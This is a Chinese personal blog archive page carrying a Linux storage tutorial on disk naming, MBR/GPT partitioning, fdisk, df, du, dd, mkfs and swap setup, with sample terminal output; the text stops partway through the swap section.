<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
    
    <title>文章归档: 2019 | zen&#39;s blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
    <meta name="description" content="Jelon个人前端小站" >

    
    <link rel="alternative" href="/atom.xml" title="zen&#39;s blog" type="application/atom+xml" >
    
    
    <link rel="shortcut icon" href="../../favicon.ico" >
    
    
<link rel="stylesheet" href="../../css/style.css">

    <!--[if lt IE 9]>
    
<script src="../../js/html5.js"></script>

    <![endif]-->
    
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d5ebf515ab530cfbdda5f5c85093fb41";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 4.2.0"></head>

<body class="home">
    <!--[if lt IE 9]>
    <div class="browsehappy">
        当前网页 <strong>不支持</strong>
        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank" rel="noopener">升级你的浏览器</a>.
    </div>
    <![endif]-->

    <!-- 博客头部 -->
    <header class="header">
    <section class="container header-main">
        <div class="logo">
            <a href="../../index.html">
                <div class="cover">
                    <span class="name">zen&#39;s blog</span>
                    <span class="description"></span>
                </div>
            </a>
        </div>
        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
        <ul class="menu hidden" id="JELON__menu">
            
            <li rel="" class="item ">
                <a href="../../index.html" title="首页" class="icon-home">&nbsp;首页</a>
            </li>
            
            <li rel="" class="item ">
                <a href="../../lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
            </li>
            
            <li rel="" class="item ">
                <a href="../../about/" title="关于" class="icon-about">&nbsp;关于</a>
            </li>
            
            <li rel="" class="item ">
                <a href="../../comment/" title="留言" class="icon-comment">&nbsp;留言</a>
            </li>
            
        </ul>
        <div class="profile clearfix">
            <div class="feeds fl">
                
                
                <p class="links">
                    
                        <a href="https://github.com/jangdelong" target="_blank">Github</a>
                        |
                    
                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
                        
                    
                </p>
                <p class="sns">
                    
                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
                    
                        <a href="https://www.facebook.com/profile.php?id=100011855760219&amp;ref=bookmarks" class="qqweibo" target="_blank"><b>■</b> Facebook</a>
                    
                    <a href="javascript: void(0);" class="wechat">
                        <b>■</b>
                        公众号
                        <span class="popover">
                            <img src="../../img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
                            <i class="arrow"></i>
                        </span>
                    </a>
                </p>
                
            </div>
            <div class="avatar fr">
                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
            </div>
        </div>
    </section>
</header>


    <!-- 博客正文 -->
    <div class="container body clearfix">
        <section class="content">
            <div class="content-main widget">
                <!-- 文章归档 -->

    <h3 class="widget-hd">
        <strong>
            
                文章归档
                <!-- 文章归档，可以根据日期分类 -->
            
        </strong>
    </h3>
    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="../../categories/Linux/">Linux</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/12/25/Linux%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8/">
    		Linux系统存储
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-12-25T11:27:45.000Z">2019-12-25</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h1 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h1><p>磁盘设备根据接口进行命名，IDE接口的，以<code>/dev/hd</code>的形式命名。而SCSI、SATA、SAS、USB接口的，以<code>sda,sdb,sdc</code>的形式命名，不同的设备划分的名字从<code>a-z</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IDE的英文全称为“Integrated Drive Electronics”，即“电子集成驱动器”，它的本意是指把“硬盘控制器”与“盘体”集成在一起的硬盘驱动器,这种类型的接口随着接口技术的发展已经被淘汰了，而其后发展分支出更多类型的硬盘接口，比如ATA、Ultra ATA、DMA、Ultra DMA等接口都属于IDE硬盘。</span><br><span class="line"></span><br><span class="line">以上是传统的并行ATA传输方式，后来又出现了串行ATA（Serial ATA，简称SATA），其最大数据传输率更进一步提高到了150MB/sec。</span><br><span class="line"></span><br><span class="line">SATA的全称是Serial Advanced Technology Attachment，是 由Intel、IBM、Dell、APT、Maxtor和seagate公司共同提出的硬盘接口规范。SATA规范将硬盘的外部传输速率理论值提高到了150MB/s。SATA的优势：支持热插拔 ，传输速度快，执行效率高。</span><br><span class="line">SATA接口需要硬件芯片的支持 ，例如Intel ICH5(R)、VIA VT8237、nVIDIA的MCP RAID和SiS964，如果主板南桥芯片不能直接支持的话，就需要选择第三方的芯片 ，例如SiliconImage 3112A芯片等，不过这样也就会产生一些硬件性能的差异，并且驱动程序也比较繁杂。</span><br></pre></td></tr></table></figure>



<p>更多接口知识：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/LinuxSuDa/p/4513996.html" target="_blank" rel="noopener">https://www.cnblogs.com/LinuxSuDa/p/4513996.html</a></p>
</blockquote>
<h2 id="两种分区"><a href="#两种分区" class="headerlink" title="两种分区"></a>两种分区</h2><p>部分文件摘录于：</p>
<blockquote>
<p><a href="https://blog.csdn.net/efhgyj/article/details/91174541" target="_blank" rel="noopener">https://blog.csdn.net/efhgyj/article/details/91174541</a></p>
</blockquote>
<p>对于同一块硬盘，又可以有不同的分区，分区的划分以数字命名，如：<code>sdb1,sdb2,sdb3</code>。分区的方式有：MBR分区和GPT分区。</p>
<p><strong>MBR分区</strong></p>
<p>​    MBR的意思是“主引导记录”，是IBM公司早年间提出的。它是存在于磁盘驱动器开始部分的一个特殊的启动扇区。这个扇区包含了已安装的操作系统系统信息，并用一小段代码来启动系统。如果你安装了Windows，其启动信息就放在这一段代码中——如果MBR的信息损坏或误删就不能正常启动Windows，这时候你就需要找一个引导修复软件工具来修复它就可以了。Linux系统中MBR通常会是GRUB加载器。MBR。当一台电脑启动时，它会先启动主板自带的BIOS系统，bios加载MBR，MBR再启动Windows，这就是mbr的启动过程。</p>
<p><strong>GPT分区</strong></p>
<p>GPT的意思是GUID Partition Table，即“全局唯一标识磁盘分区表”。他是另外一种更加先进新颖的磁盘组织方式，一种使用UEFI启动的磁盘组织方式。最开始是为了更好的兼容性，后来因为其更大的支持内存（mbr分区最多支持2T的磁盘），更多的兼容而被广泛使用，特别是苹果的MAC系统全部使用gpt分区。gtp不在有分区的概念，所有CDEF盘都在一段信息中存储。可以简单的理解为更先进但是使用不够广泛的技术。</p>
<p><strong>两者之间的区别</strong></p>
<p>因为兼容问题，gpt其实在引导的最开始部分也有一段MBR引导，也叫做“保护引导”，为了防止设备不支持UEFI</p>
<p>1、MBR最多支持2T，而GPT理论上是无限制的。</p>
<p>2、MBR最多支持四个主分区，GPT没有限制。如果你想跑多系统，MBR最多4个而GPT没有限制。</p>
<p>3、win7只能用MBR分区，从Win8开始微软建议你使用GPT。</p>
<p>4、GPT是由UEFI启动的，而UEFI是后来才提出的概念，兼容性和稳定性不如BIOS+MBR。</p>
<p><img src="https://i.loli.net/2019/12/26/8ArMdUL1yKfqIOc.png" alt="image.png"></p>
<p><strong>Windows系统分区</strong></p>
<p>最先出现在Windows8中设置新磁盘，系统会询问你是想要使用MBR还是GPT分区，GPT是一种新的硬盘分区标准。GPT带来了很多新特性，最大支持18EB的大容量（EB=1024 PB，PB=1024 TB）；MBR最大只支持2TB，但拥有最好的兼容性。</p>
<ul>
<li>MBR（Master Boot Record）分区：</li>
</ul>
<p>MBR的意思是“主引导记录”，它有自己的启动器，也就是启动代码，一旦启动代码被破坏，系统就没法启动，只有通过修复才能启动系统。最大支持2TB容量，在容量方面存在着极大的瓶颈，那么GPT在今后的发展就会越来越占优势，MBR也会逐渐被GPT取代。</p>
<ul>
<li>GPT（GUID Partition Table）分区：</li>
</ul>
<p>GPT意为GUID分区表，这是一个正逐渐取代MBR的新标准，它由UEFI辅助而形成的，这样就有了UEFI用于取代老旧的BIOS，而GPT则取代老旧的MBR。这个标准没有MBR的那些限制。磁盘驱动器容量可以大得多，大到操作系统和文件系统都没法支持。它同时还支持几乎无限个分区数量，限制只在于操作系统，Windows支持最多128个GPT分区。通过UEFI，所有的64位的win10，win8，win7和Vista，以及所对应的服务器都能从GPT启动</p>
<p>有区别，GPT和MBR是不同的分区表类型。使用MBR分区表的硬盘最多只能划分4个主分区磁盘，并且MBR最大仅支持2TB的硬盘。如果需要分区的硬盘容量超过2TB了，则需要使用GPT分区表类型，此分区表类型不受分区个数、硬盘大小的限制。</p>
<p>UEFI，全称Unified Extensible Firmware Interface，即“统一的可扩展固件接口”，是一种详细描述全新类型接口的标准，是适用于电脑的标准固件接口，旨在代替BIOS（基本输入/输出系统）。此标准由UEFI联盟中的140多个技术公司共同创建，其中包括微软公司。UEFI旨在提高软件互操作性和解决BIOS的局限性。</p>
<p>要详细了解UEFI，还得从BIOS讲起。我们都知道，每一台普通的电脑都会有一个BIOS，用于加载电脑最基本的程式码，担负着初始化硬件，检测硬件功能以及引导操作系统的任务。UEFI就是与BIOS相对的概念，这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上，从而达到开机程序化繁为简节省时间的目的。传统BIOS技术正在逐步被UEFI取而代之，在最近新出厂的电脑中，很多已经使用UEFI，使用UEFI模式安装操作系统是趋势所在。</p>
<ul>
<li>总结</li>
</ul>
<p>UEFI是新式的BIOS，legacy是传统BIOS。你在UEFI模式下安装的系统，只能用UEFI模式引导；同理，如果你是在Legacy模式下安装的系统，也只能在legacy模式下进系统。UEFI只支持64为系统且磁盘分区必须为GPT模式，传统BIOS使用INT13中断读取磁盘，每次只能读64KB，非常低效，而UEFI每次可以读1MB，载入更快。此外，Win8，更是进一步优化了UEFI支持，号称可以实现瞬时开机。</p>
<h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#选择一块需要划分区的磁盘</span></span><br><span class="line">[root@localhost ~]<span class="comment"># fdisk /dev/sdb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或者查看磁盘里面的分区</span></span><br><span class="line">[root@node1 ~]<span class="comment"># fdisk /dev/sdb -l</span></span><br><span class="line">Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x6b7b90db</span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdb1            2048    10487807     5242880   8e  Linux LVM</span><br><span class="line">/dev/sdb2        10487808    41943039    15727616   8e  Linux LVM</span><br><span class="line">[root@node1 ~]<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看内核当中是否识别新的分区</span></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /proc/partitions </span></span><br><span class="line"><span class="comment">#通知内核重新读取磁盘分区</span></span><br><span class="line">[root@localhost ~]<span class="comment"># partx -a /dev/sdb1</span></span><br><span class="line">partx: /dev/sdb: error adding partition 1</span><br><span class="line"><span class="comment">#或者是：</span></span><br><span class="line">[root@localhost ~]<span class="comment"># partprobe /dev/sdb1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#上面那个是识别分区的，下面这个是识别磁盘的。</span></span><br><span class="line"><span class="comment">#执行如下命令扫描磁盘:  echo "- - -" &gt;  /sys/class/scsi_host/host0/scan</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看内核分区</span></span><br><span class="line">[root@node1 ~]<span class="comment"># cat /proc/partitions</span></span><br></pre></td></tr></table></figure>





<h2 id="分区管理的子命令"><a href="#分区管理的子命令" class="headerlink" title="分区管理的子命令"></a>分区管理的子命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): m</span><br><span class="line">Command action</span><br><span class="line">   a   toggle a bootable flag</span><br><span class="line">   b   edit bsd disklabel</span><br><span class="line">   c   toggle the dos compatibility flag</span><br><span class="line">   d   删除分区</span><br><span class="line">   g   create a new empty GPT partition table</span><br><span class="line">   G   create an IRIX (SGI) partition table</span><br><span class="line">   l   列出已知分区类型</span><br><span class="line">   m   打印帮助菜单</span><br><span class="line">   n   添加一个新分区</span><br><span class="line">   o   create a new empty DOS partition table</span><br><span class="line">   p   打印分区表</span><br><span class="line">   q   不保存退出</span><br><span class="line">   s   create a new empty Sun disklabel</span><br><span class="line">   t   改变分区系统的ID（类型）</span><br><span class="line">   u   change display/entry units</span><br><span class="line">   v   verify the partition table</span><br><span class="line">   w   保存修改并退出</span><br><span class="line">   x   extra functionality (experts only)</span><br></pre></td></tr></table></figure>



<p>新建分区：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): n</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p #选择主分区</span><br><span class="line">Partition number (2-4, default 2): 2 #一个有四个主分区，一个扩展分区，扩展分区可以用来分逻辑分区</span><br><span class="line">First sector (10487808-41943039, default 10487808): </span><br><span class="line">Using default value 10487808</span><br><span class="line">#分1个G给这个分区</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (10487808-41943039, default 41943039): +1G </span><br><span class="line">Partition 2 of type Linux and of size 1 GiB is set</span><br><span class="line"></span><br><span class="line">Command (m for help): p #查看当前分区表</span><br><span class="line"></span><br><span class="line">Disk &#x2F;dev&#x2F;sdd: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units &#x3D; sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line">Disk label type: dos</span><br><span class="line">Disk identifier: 0x8809f989</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">&#x2F;dev&#x2F;sdd1            2048    10487807     5242880   8e  Linux LVM</span><br><span class="line">&#x2F;dev&#x2F;sdd2        10487808    12584959     1048576   83  Linux</span><br></pre></td></tr></table></figure>



<p>删除分区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): d</span><br><span class="line">Partition number (1,2, default 2): </span><br><span class="line">Partition 2 is deleted</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sdd: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x8809f989</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdd1            2048    10487807     5242880   8e  Linux LVM</span><br></pre></td></tr></table></figure>



<p>改变分区的格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): l <span class="comment">#列出当前分区的所有格式</span></span><br><span class="line"></span><br><span class="line"> 0  Empty           24  NEC DOS         81  Minix / old Lin bf  Solaris        </span><br><span class="line"> 1  FAT12           27  Hidden NTFS Win 82  Linux swap / So c1  DRDOS/sec (FAT-</span><br><span class="line"> 2  XENIX root      39  Plan 9          83  Linux           c4  DRDOS/sec (FAT-</span><br><span class="line"> 3  XENIX usr       3c  PartitionMagic  84  OS/2 hidden C:  c6  DRDOS/sec (FAT-</span><br><span class="line">--------------------------------，，，，------------------------------</span><br><span class="line">1c  Hidden W95 FAT3 75  PC/IX           be  Solaris boot    ff  BBT </span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t <span class="comment">#改变分区</span></span><br><span class="line">Selected partition 1</span><br><span class="line">Hex code (<span class="built_in">type</span> L to list all codes): ff  <span class="comment">#选择system id</span></span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux LVM'</span> to <span class="string">'BBT'</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdd1            2048    10487807     5242880   ff  BBT</span><br></pre></td></tr></table></figure>



<p>当为磁盘分好分区之后，就要用合适的文件系统格式化这个分区，便于对这块磁盘进行文件存储等操作。</p>
<h2 id="df命令"><a href="#df命令" class="headerlink" title="df命令"></a>df命令</h2><p><strong>du和df的区别？</strong></p>
<ul>
<li>du，disk usage,是通过搜索文件来计算每个文件的大小然后累加，du能看到的文件只是一些当前存在</li>
</ul>
<p>的，没有被删除的。他计算的大小就是当前他认为存在的所有文件大小的累加和。</p>
<ul>
<li>df，disk free，通过文件系统来快速获取空间大小的信息，当我们删除一个文件的时候，这个文件不</li>
</ul>
<p>是马上就在文件系统当中消失了，而是暂时消失了，当所有程序都不用时，才会根据OS的规则释放掉已</p>
<p>经删除的文件， df记录的是通过文件系统获取到的文件的大小，他比du强的地方就是能够看到已经删除</p>
<p>的文件，而且计算大小的时候，把这一部分的空间也加上了，更精确了。</p>
<ul>
<li><p>当文件系统也确定删除了该文件后，这时候du与df就一致了。</p>
</li>
<li><p>du查看目录大小，df查看磁盘使用情况。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>显示全部的档案系统和各分割区的磁盘使用情形</td>
</tr>
<tr>
<td>-i</td>
<td>显示i -nodes的使用量</td>
</tr>
<tr>
<td>-k</td>
<td>大小用k来表示 (默认值)</td>
</tr>
<tr>
<td>-t</td>
<td>显示某一个档案系统的所有分割区磁盘使用量</td>
</tr>
<tr>
<td>-x</td>
<td>显示不是某一个档案系统的所有分割区磁盘使用量</td>
</tr>
<tr>
<td>-T</td>
<td>显示每个分割区所属的档案系统名称</td>
</tr>
<tr>
<td>-H</td>
<td>人性化输出，换算关系是1000，而不是1024</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">查看块使用情况</span><br><span class="line">[root@localhost ~]<span class="comment"># df -h</span></span><br><span class="line">Filesystem               Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/centos-root   17G  2.3G   15G  13% /</span><br><span class="line">devtmpfs                 899M     0  899M   0% /dev</span><br><span class="line">tmpfs                    910M     0  910M   0% /dev/shm</span><br><span class="line">tmpfs                    910M  9.4M  901M   2% /run</span><br><span class="line">tmpfs                    910M     0  910M   0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1               1014M  190M  825M  19% /boot</span><br><span class="line">tmpfs                    182M     0  182M   0% /run/user/0</span><br><span class="line">/dev/sdb1                2.0G  6.0M  1.8G   1% /root/m_test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看Inode使用情况</span><br><span class="line">[root@node1 <span class="built_in">test</span>]<span class="comment"># df -i</span></span><br><span class="line">Filesystem               Inodes IUsed   IFree IUse% Mounted on</span><br><span class="line">devtmpfs                 121503   368  121135    1% /dev</span><br><span class="line">tmpfs                    124468     1  124467    1% /dev/shm</span><br><span class="line">tmpfs                    124468   720  123748    1% /run</span><br><span class="line">tmpfs                    124468    16  124452    1% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/centos-root 8910848 37480 8873368    1% /</span><br><span class="line">/dev/sda1                524288   334  523954    1% /boot</span><br><span class="line">tmpfs                    124468     1  124467    1% /run/user/0</span><br><span class="line">/dev/sdb2                 10240     4   10236    1% /root/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>



<h2 id="du命令"><a href="#du命令" class="headerlink" title="du命令"></a>du命令</h2><p>查看某目录总体空间占比</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># du -sh /*</span></span><br><span class="line">157M  /boot</span><br><span class="line">35M /etc</span><br><span class="line">76K /home</span><br><span class="line"></span><br><span class="line">-h, --human-readable  <span class="built_in">print</span> sizes <span class="keyword">in</span> human readable format (e.g., 1K 234M 2G)</span><br><span class="line">      --inodes          list inode usage information instead of block usage</span><br><span class="line">  -L, --dereference     取消所有引用符号链接</span><br><span class="line">  -s, --summarize       不显示每一级目录下每一级文件夹的占用空间，只显示当前目录</span><br></pre></td></tr></table></figure>



<h2 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=/dev/null&amp; pid</span><br><span class="line"><span class="keyword">if</span> 是源</span><br><span class="line">of 是目的</span><br><span class="line"></span><br><span class="line">/dev/zero：吐零机</span><br><span class="line">/dev/null：数据黑洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bs=<span class="comment"># 指定复制单元大小</span></span><br><span class="line">count=<span class="comment"># 指定多少个bs</span></span><br><span class="line"></span><br><span class="line">磁盘拷贝</span><br><span class="line">	dd <span class="keyword">if</span>=/dev/sda of=/dev/sdb</span><br><span class="line">将/dev/sda文件中的东西复制到/dev/sdb中</span><br><span class="line"></span><br><span class="line">两个参数</span><br><span class="line">  /dev/null --黑洞</span><br><span class="line">  /dev/zero --写0</span><br></pre></td></tr></table></figure>





<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Unix文件系统：FFS、UFS、JFS2</span><br><span class="line">网络文件系统：NFS 、CIFS</span><br><span class="line">集群文件系统：GFS2、OCF2</span><br><span class="line">分布式文件系统：ceph、Glusterfs、moosefs</span><br><span class="line">Linux文件系统:ext3,ext4,xfs</span><br></pre></td></tr></table></figure>



<p>分类：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">是否支持journal功能：</span><br><span class="line">    日志型文件系统：ext3、4、xfs...</span><br><span class="line">    非日志型文件系统：ext2、vfat</span><br><span class="line">文件系统的组成部分：</span><br><span class="line">    内核中的模块：ext4、xfs、vfat</span><br><span class="line">    用户空间的管理工具：mkfs、ext4、xfs、vfat</span><br><span class="line">Linux虚拟文件系统：VFS</span><br></pre></td></tr></table></figure>



<h2 id="格式化磁盘分区"><a href="#格式化磁盘分区" class="headerlink" title="格式化磁盘分区"></a>格式化磁盘分区</h2><p>用不同的文件系统格式化磁盘分区</p>
<p>比如：将<code>/dev/sdb1</code>这个分区用ext4文件系统格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mkfs.ext4 /dev/sdb1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#一下两种方式是等价的</span></span><br><span class="line">mkfs.ext4 /dev/DEVICE  == mkfs -t ext4 /dev/DEVICE</span><br><span class="line"><span class="comment">#其中FS_TYPE是磁盘格式，可以是： ext4 xfs btrfs vfat等</span></span><br></pre></td></tr></table></figure>



<h2 id="swap交换分区"><a href="#swap交换分区" class="headerlink" title="swap交换分区"></a>swap交换分区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将/dev/sdb1分区以swap形式格式化</span></span><br><span class="line">[root@node1 ~]<span class="comment"># mkswap /dev/sdd1</span></span><br><span class="line">mkswap: /dev/sdd1: warning: wiping old LVM2_member signature.</span><br><span class="line">Setting up swapspace version 1, size = 5242876 KiB</span><br><span class="line">no label, UUID=14fd926a-fac0-490b-9162-b00ccf8c7797</span><br><span class="line"></span><br><span class="line"><span 